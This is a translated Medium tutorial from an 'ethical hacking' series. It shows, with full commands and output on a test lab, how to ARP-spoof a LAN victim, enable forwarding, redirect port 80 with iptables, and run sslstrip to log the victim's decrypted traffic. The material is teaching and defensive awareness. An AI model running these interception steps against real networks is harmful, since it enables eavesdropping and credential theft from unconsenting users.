# ARP 欺骗和 SSL 带

> 原文：<https://levelup.gitconnected.com/ethical-hacking-part-10-arp-spoofing-ssl-strip-ea5f0cc892f3>

## 道德黑客了解风险以防止攻击——重定向局域网流量和解密加密流量

![](img/859254ffc0c3b10ecead2885cf747a18.png)

## ARP 欺骗

作为一名网络架构师，我怎么强调在第 2 层实施必要的安全预防措施都不为过。我见过许多网络，其中第 2 层只是作为标准实现的。你真的应该至少考虑 802.1x 认证、ARP 检查和专用 VLANs。不要只实施没有额外安全性的基本第 2 层网络，否则你会后悔的。

对于本教程，我将在 192.168.1.1 上使用我的测试受害者机器。在现实世界中，你可能不知道受害者的 IP 地址。使用名为网络映射器(" **nmap** ")的工具，您可以执行网络扫描并检测网段上的大多数(如果不是全部)设备。

在此之前，我们应该真正了解网络上的默认网关(路由器)是什么。我们可以看到它是 192.168.1.254。

```
root@kali:~# **route**
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         **192.168.1.254**   0.0.0.0         UG    100    0        0 eth0
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
```

我们还可以看到我的 Kali 实例运行在 192.168.1.2 上。

```
root@kali:~# **ip a**
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:24:30:b1 brd ff:ff:ff:ff:ff:ff
    inet **192.168.1.2/24** brd 192.168.1.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
```

为了节省时间，我们希望从扫描中排除路由器和我们自己。

```
root@kali:~# **nmap 192.168.1.1,3-253 -vv**
Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org) ) at 2020-10-20 10:49 BST
Initiating ARP Ping Scan at 10:49
Scanning 252 hosts [1 port/host]
```

这可能需要一些时间，但会返回网段上的主机以及它们正在监听的端口。如果您愿意，还可以包含其他参数。

在现实世界中，您无法访问受害者机器，但出于兴趣，让我们看看当前的正常状态。

```
% **arp 192.168.1.254** 
? (192.168.1.254) at **e8:ad:a6:d0:44:b1** on en1 ifscope [ethernet]
```

我们可以看到，受害者目前认为路由器 MAC 是 **e8:ad:a6:d0:44:b1** 它是**。**

我们还可以创建通往 8.8.8.8 的外部跟踪路由，下一跳是路由器。

```
% **traceroute 8.8.8.8**
traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets
 1  **192.168.1.254** (192.168.1.254)  1.407 ms  1.072 ms  1.081 ms
```

所以到目前为止一切看起来都很好…

现在让我们回到我们的卡利实例。我们将通过提供接口“ **eth0** ”、受害者 IP“**192 . 168 . 1 . 1**”、默认网关“ **192.168.1.254** ”来运行“ **arpspoof** ”。只要这个运行，ARP 攻击就在发生。

```
root@kali:~# **arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.254**
8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at 8:0:27:24:30:b1
8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 8:0:27:24:30:b1
8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at 8:0:27:24:30:b1
8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 8:0:27:24:30:b1
8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at 8:0:27:24:30:b1
```

让我们看看受害者身上发生了什么…

```
% **arp 192.168.1.254** 
? (192.168.1.254) at **8:0:27:24:30:b1** on en1 ifscope [ethernet]
```

这可不好。

受害机现在认为默认网关路由器的 MAC 是 **8:0:27:24:30:b1** 。实际默认网关是 **e8:ad:a6:d0:44:b1** 。

```
% **traceroute 8.8.8.8**
traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets
 1  **192.168.1.2** (192.168.1.2)  0.447 ms  0.267 ms  0.198 ms 
```

您现在可以看到，所有流量首先被路由到我的 Kali 实例。

这不是很好，因为默认情况下 linux 主机不会路由流量。如果不属于它的流量被定向到它，那么它将被丢弃。

为了做到这一点，我们需要将 Kali 配置为路由器，这样它就可以转发数据包。

```
root@kali:~# **echo "1" > /proc/sys/net/ipv4/ip_forward**
root@kali:~# **cat /proc/sys/net/ipv4/ip_forward**
1
```

现在让我们再次尝试受害者的**追踪路线**…

```
% **traceroute 8.8.8.8**
traceroute to 8.8.8.8 (8.8.8.8), 64 hops max, 52 byte packets
 1  **192.168.1.2** (192.168.1.2)  0.447 ms  0.267 ms  0.198 ms
 2  192.168.1.254 (192.168.1.254)  1.371 ms  1.164 ms  1.227 ms
```

来自我的受害者的流量现在通过我的 Kali 实例路由，除了稍微慢一点之外，几乎看不出来。

出于兴趣，如果你想阻止 ARP 欺骗攻击，请按 Ctrl+C，然后“**ARP 欺骗**”工具会自动清除一切。受害者机器上的一切都会恢复正常。

```
^C**Cleaning up and re-arping targets...**
8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at e8:ad:a6:e0:45:a1
8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 28:f0:76:46:d1:3a
8:0:27:24:30:b1 28:f0:76:45:c1:2a 0806 42: arp reply 192.168.1.254 is-at e8:ad:a6:e0:45:a1
8:0:27:24:30:b1 e8:ad:a6:d0:44:b1 0806 42: arp reply 192.168.1.1 is-at 28:f0:76:46:d1:3a
```

因此，所有流量现在都通过我们的 Kali 实例进行路由。今天，大多数网站都使用 HTTPS/SSL 加密。因此，除了看到受害者浏览的网站之外，你通过 Kali 实例看到的内容并不那么有趣。如果有一种方法可以使用“**中间人**攻击来即时解密流量，那就太好了。

这就是工具“ **sslstrip** ”发挥作用的地方。请注意，现在许多浏览器都有预防措施来防止这种情况。并非所有浏览器都允许这种情况发生，所以受害者需要使用旧的或非标准的浏览器。我的意思是，这几天 Chrome 和 Firefox 不太可能返回任何结果。我没有试过 Safari 或 Internet Explorer，但也许他们会。您将主要针对维护不良的 IT 基础设施或未得到妥善照管的设备。

## SSL 带

如果你试图从 2020 年开始在 Kali 中安装 SSL Strip，你会注意到这不是一个简单的任务。你可能会发现自己在一个又一个错误中工作，但仍然没有成功。我设法让它工作如下。

*   从 [Github repo](https://github.com/moxie0/sslstrip) 中克隆 SSL 带

```
root@kali:~# **apt install git -y**
Reading package lists... Done
Building dependency tree       
Reading state information... Done
git is already the newest version (1:2.28.0-1).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.root@kali:~# **git clone** [**https://github.com/moxie0/sslstrip**](https://github.com/moxie0/sslstrip)
Cloning into 'sslstrip'...
remote: Enumerating objects: 42, done.
remote: Total 42 (delta 0), reused 0 (delta 0), pack-reused 42
Unpacking objects: 100% (42/42), 30.58 KiB | 1.27 MiB/s, done.
```

*   安装 Python 包管理器" **pip** "

```
root@kali:~# **apt install python3-pip -y**
Reading package lists... Done
Building dependency tree       
Reading state information... Done
python3-pip is already the newest version (20.1.1-2).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

*   使用“ **pip3** ”安装 Python“**virtualenv**”。

```
root@kali:~# **pip3 install virtualenv**
Requirement already satisfied: virtualenv in /usr/local/lib/python3.8/dist-packages (20.0.35)
Requirement already satisfied: six<2,>=1.9.0 in /usr/local/lib/python3.8/dist-packages (from virtualenv) (1.15.0)
Requirement already satisfied: filelock<4,>=3.0.0 in /usr/local/lib/python3.8/dist-packages (from virtualenv) (3.0.12)
Requirement already satisfied: distlib<1,>=0.3.1 in /usr/local/lib/python3.8/dist-packages (from virtualenv) (0.3.1)
Requirement already satisfied: appdirs<2,>=1.4.3 in /usr/lib/python3/dist-packages (from virtualenv) (1.4.4)
```

*   使用 **Python 2 ←** 创建您的 Python 虚拟环境

```
root@kali:~# **virtualenv -p python2 sslstripenv**
created virtual environment CPython2.7.18.final.0-64 in 111ms
  creator CPython2Posix(dest=/root/sslstripenv, clear=False, global=False)
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/root/.local/share/virtualenv)
    added seed packages: pip==20.2.3, setuptools==44.1.1, wheel==0.35.1
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator
```

*   加载您的“ **sslstripenv** ”虚拟环境。

```
root@kali:~# **. sslstripenv/bin/activate**
(sslstripenv) root@kali:~#
```

*   转到 Git 克隆的" **sslstrip** "目录。

```
(sslstripenv) root@kali:~# **cd sslstrip**
(sslstripenv) root@kali:~/sslstrip#
```

*   使用“ **pip** ”安装以下依赖项。

```
(sslstripenv) root@kali:~/sslstrip# **pip install Twisted pyOpenSSL service_identity***** INSTALLATION PROCESS ***
```

*   如果一切按计划进行，那么现在应该运行" **sslstrip.py** "了。

```
(sslstripenv) root@kali:~/sslstrip# **python sslstrip.py -h**
/root/sslstripenv/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509sslstrip 0.9 by Moxie Marlinspike
Usage: sslstrip <options>Options:
-w <filename>, --write=<filename> Specify file to log to (optional).
-p , --post                       Log only SSL POSTs. (default)
-s , --ssl                        Log all SSL traffic to and from server.
-a , --all                        Log all SSL and HTTP traffic to and from server.
-l <port>, --listen=<port>        Port to listen on (default 10000).
-f , --favicon                    Substitute a lock favicon on secure requests.
-k , --killsessions               Kill sessions in progress.
-h                                Print this help message.
```

您可以忽略这个警告，因为“ **sslstrip** ”目前似乎只适用于 Python 2。如果你尝试使用 Python 和/或 PIP 版本 3，你将打开 pandoras 问题箱。解决这个问题的方法是创建一个 Python 2 虚拟环境，然后它就可以工作了。

如果你不熟悉 Python 虚拟环境，你可以输入" **deactivate** "退出。

```
(sslstripenv) root@kali:~/sslstrip# **deactivate**
root@kali:~/sslstrip#
```

如果你想再次进入你做如下。

```
root@kali:~/sslstrip# **cd**
root@kali:~# **. sslstripenv/bin/activate**
(sslstripenv) root@kali:~# **cd sslstrip**
(sslstripenv) root@kali:~/sslstrip# **python sslstrip.py -h**
```

## 基本用法

" **sslstrip** "监听特定端口上的流量，因此我们需要使用" **iptables** "监听该端口上的 HTTPS 流量，并将其转发到可配置端口 TCP 8080 上的" **sslstrip** "。

```
root@kali:~# **iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080**
```

让我们验证它是否存在…

```
root@kali:~# **iptables -t nat -L -v -n**
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 **0     0 REDIRECT   tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 redir ports 8080**Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destinationChain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destinationChain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destinationroot@kali:~# **iptables -t nat -L PREROUTING**
Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
**REDIRECT   tcp  --  anywhere             anywhere             tcp dpt:http redir ports 8080**
```

" **ssltrip** "将 HTTPS 连接转换为 HTTP，顾名思义就是剥离加密层。" **sslstrip** "跟踪状态，来自客户端的未加密响应将以加密形式传递给服务器。

然后，您需要在已配置的端口上运行“ **sslstrip** ”，在我们的例子中是 **TCP 8080** 。

```
(sslstripenv) root@kali:~/sslstrip# **python sslstrip.py -l 8080**
/root/sslstripenv/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509sslstrip 0.9 by Moxie Marlinspike running...
```

现在，假设您使用 ARP 欺骗在您的 Kali 实例上引导流量，IP 表配置正确，您正在运行 SSL Strip，并且受害者正在使用易受攻击的浏览器，当他们浏览到 HTTPS 站点时，您应该会在此处看到日志记录。

一个好主意是打开另一个终端窗口和"**tail**" the "**sslstrip**"日志文件。这将允许您在不中断工具的情况下查看结果。

```
root@kali:~/sslstrip# **tail -f -n 0 sslstrip.log**
```

为了进一步阅读，看看我写的关于这个话题的 19 个故事。

![Michael Whittle](img/f4d39d0c62b7f2e165491c1e2a8c6e26.png)

迈克尔·惠特尔

## 道德黑客培训课程

[View list](https://whittle.medium.com/list/ethical-hacking-training-course-710769700b83?source=post_page-----ea5f0cc892f3--------------------------------)19 stories![](img/57c6829d9a7a0ff6d78e5d828845bb8c.png)![](img/e2d3aa85ee76ceb2b889dd753c231b67.png)![](img/6240cd235d84e9cd8cb158d7147a71f5.png)

# 迈克尔·惠特尔

*   ***如果你喜欢这个，请*** [***跟我上媒***](https://whittle.medium.com/)
*   ***更多有趣的文章，请*** [***关注我的刊物***](https://medium.com/trading-data-analysis)
*   ***有兴趣合作吗？*** [***让我们连线 LinkedIn 上的***](https://www.linkedin.com/in/miwhittle/)
*   ***支持我和其他媒体作者*** [***在此报名***](https://whittle.medium.com/membership)
*   ***请别忘了为文章鼓掌:)←谢谢！***